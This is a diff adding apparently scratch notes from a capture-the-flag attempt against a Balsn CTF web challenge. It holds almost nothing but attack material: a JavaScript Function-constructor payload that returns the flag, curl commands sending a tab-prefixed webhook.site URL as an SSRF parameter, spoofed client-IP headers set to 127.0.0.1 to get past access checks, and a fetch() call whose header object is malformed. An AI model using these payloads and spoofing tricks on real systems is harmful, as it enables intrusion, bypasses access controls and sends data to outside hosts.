@@ -1,0 +1,38 @@
+	https://webhook.site/e0997442-9e53-4f41-bcdd-a88ea95e01e8?a=123
+
+	{var dot} {Function`x ${`for ${par`dot of help`} { } return dot`}` ``} {Function`x ${`return constructor${dot}constructor`}` `` `return flag` ``}
+
+
+curl http://the-woven-web.balsnctf.com/?url=%09https%3A%2F%2Fwebhook.site%2F0e1901b0-bc50-40a6-ad1f-a8b6437da7fe -H 'x-real-ip:asd'
+curl https://webhook.site/0e1901b0-bc50-40a6-ad1f-a8b6437da7fe -H 'x-real-ip:asd'
+https://webhook.site/0e1901b0-bc50-40a6-ad1f-a8b6437da7fe
+X-Real-IP
+curl http://the-woven-web.balsnctf.com/?url=%09https%3A%2F%2Fwebhook.site%2F0e1901b0-bc50-40a6-ad1f-a8b6437da7fe -H 'X-Real-IP:asd'
+curl -H 'X-Real-IP:asd' -H "X-Forwarded-For:asdasd" http://the-woven-web.balsnctf.com/?url=%09https%3A%2F%2Fwebhook.site%2F0e1901b0-bc50-40a6-ad1f-a8b6437da7fe 
+curl -H "X-Originating-IP:asdasd"  -H "X-Remote-Addr:asdasd"  -H "Client-IP:asdasd"   -H "Client-IP:asdasd"  -H "X-Client-IP:asdasd"  -H "X-Originating-IP:asdasd"  -H "X-Forwarded-For:asdasd" -H 'X-Real-IP:asd' -H "X-Forwarded-For:asdasd" http://the-woven-web.balsnctf.com/?url=%09https%3A%2F%2Fwebhook.site%2F0e1901b0-bc50-40a6-ad1f-a8b6437da7fe 
+curl -H "X-Originating-IP:asdasd"  -H "X-Remote-Addr:asdasd"  -H "Client-IP:asdasd"   -H "Client-IP:asdasd"  -H "X-Client-IP:asdasd"  -H "X-Originating-IP:asdasd"  -H "X-Forwarded-For:asdasd" -H 'X-Real-IP:asd' -H "X-Forwarded-For:asdasd" https://webhook.site/0e1901b0-bc50-40a6-ad1f-a8b6437da7fe 
+X-Forwarded-For
+Client-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+curl -H "X-Originating-IP:asdasd"  -H "X-Remote-Addr:asdasd"  -H "Client-IP:asdasd"   -H "Client-IP:asdasd"  -H "X-Client-IP:asdasd"  -H "X-Originating-IP:asdasd"  -H "X-Forwarded-For:asdasd" -H 'X-Real-IP:asd' -H "X-Forwarded-For:asdasd" 
+
+fetch('http://the-woven-web.balsnctf.com/?url=%09https%3A%2F%2Fwebhook.site%2F0e1901b0-bc50-40a6-ad1f-a8b6437da7fe', 
+	{
+		headers: {
+			 "X-Originating-IP:asdasd"  ,
+			  "X-Remote-Addr:asdasd"  ,
+			  "Client-IP:asdasd"  ,
+			   "Client-IP:asdasd"  ,
+			    "X-Client-IP:asdasd"  
+				, "X-Originating-IP:asdasd" ,
+				 "X-Forwarded-For:asdasd" ,
+				  'X-Real-IP:asd' ,
+				   "X-Forwarded-For:asdasd"
+		}
+	}
+)
